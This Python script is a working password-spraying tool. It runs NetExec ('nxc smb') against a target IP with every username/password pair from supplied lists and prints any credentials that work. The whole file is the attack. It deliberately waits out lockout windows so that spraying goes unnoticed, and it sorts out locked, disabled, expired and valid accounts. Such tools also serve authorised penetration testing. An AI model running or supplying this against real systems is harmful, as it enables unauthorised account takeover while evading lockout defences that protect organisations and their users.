import argparse
import subprocess
import time
import math
from time import localtime, strftime
from termcolor import colored

def execute_nxc(target_ip, username_file, password_file, lockout_count, lockout_timeout, debug, local_auth, verbose, timestamp):
    with open(username_file, 'r') as ufile:
        usernames = ufile.read().splitlines()
    with open(password_file, 'r') as pfile:
        passwords = pfile.read().splitlines()

    password_attempted_count = 0
    skip_users = set()  # Set to hold usernames to skip

    for password in passwords:
        password_attempted_count += 1
        if password_attempted_count % lockout_count == 0:
            ts_msg = f"[{strftime('%Y-%m-%d %H:%M:%S', localtime())}] - " if timestamp else ""
            print(colored(ts_msg + f"Approaching lockout limit. Waiting {lockout_timeout} minutes to reset lockout timer...", "yellow", attrs=['bold']))
            time.sleep(lockout_timeout * 60)

        ts_msg = f"[{strftime('%Y-%m-%d %H:%M:%S', localtime())}] - " if timestamp else ""
        print(ts_msg + f"Spraying password: {colored(password, 'blue', attrs=['bold'])}")

        for username in usernames:
            if username in skip_users:
                continue  # Skip this user if they are in the skip list
            
            command = ["nxc", "smb", target_ip, "-u", username, "-p", password, "--continue-on-success"]
            if debug:
                command.append("--verbose")
            if local_auth:
                command.append("--local-auth")

            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, errors = process.communicate()

            ts_msg = f"[{strftime('%Y-%m-%d %H:%M:%S', localtime())}] - " if timestamp else ""
            if b"STATUS_ACCOUNT_LOCKED_OUT" in output:
                print(colored(ts_msg + f"Account lockout detected for {colored(username, 'yellow', attrs=['bold'])}", "cyan", attrs=['bold']))
                skip_users.add(username)
            if b"STATUS_ACCOUNT_DISABLED" in output:
                print(colored(ts_msg + f"Account is disabled for {colored(username, 'yellow', attrs=['bold'])}", "cyan", attrs=['bold']))
                skip_users.add(username)
            if b"STATUS_PASSWORD_MUST_CHANGE" in output:
                print(colored(ts_msg + f"Password is correct, but must be changed for {colored(username + ':' + password, 'yellow', attrs=['bold'])}", "cyan", attrs=['bold']))
                skip_users.add(username)
            if b"STATUS_PASSWORD_EXPIRED" in output:
                print(colored(ts_msg + f"Password is expired, but can be changed for for {colored(username + ':' + password, 'yellow', attrs=['bold'])}", "cyan", attrs=['bold']))
                skip_users.add(username)
            if b"STATUS_LOGON_FAILURE" in output and (debug or verbose):
                print(colored(ts_msg + f"Failed login for {username + ':' + password}", "red", attrs=['bold']))
            if b"[+]" in output:
                print(colored(ts_msg + f"Successful login: {username + ':' + password}", "green", attrs=['bold']))
                skip_users.add(username)

            if debug:
                print(ts_msg + output.decode())
                if errors:
                    print(colored(ts_msg + errors.decode(), "red"))
        
        ts_msg = f"[{strftime('%Y-%m-%d %H:%M:%S', localtime())}] - " if timestamp else ""
        print(colored(ts_msg + f"Progress {math.floor(password_attempted_count/len(passwords) * 100)}% ({password_attempted_count}/{len(passwords)} passwords)",'blue', attrs=['bold']))

def main():
    parser = argparse.ArgumentParser(description="Perform password spraying without causing account lockouts.")
    parser.add_argument("--target-ip", required=True, help="Target IP address for SMB.")
    parser.add_argument("--username-file", required=True, help="File containing usernames.")
    parser.add_argument("--password-file", required=True, help="File containing passwords.")
    parser.add_argument("--lockout-count", type=int, required=True, help="Number of passwords tried before lockout risk per user.")
    parser.add_argument("--lockout-timeout", type=int, required=True, help="Minutes to wait after reaching lockout count.")
    parser.add_argument("--debug", action="store_true", help="Enable debug output.")
    parser.add_argument("--timestamp", action="store_true", help="Print a timestamp for each line in the output.")
    parser.add_argument("--verbose", action="store_true", help="Print verbose output. Print failed attempts.")
    parser.add_argument("--local-auth", action="store_true", help="Use local authentication flag in nxc.")

    args = parser.parse_args()

    execute_nxc(args.target_ip, args.username_file, args.password_file, args.lockout_count, args.lockout_timeout, args.debug, args.local_auth, args.verbose, args.timestamp)

if __name__ == "__main__":
    main()
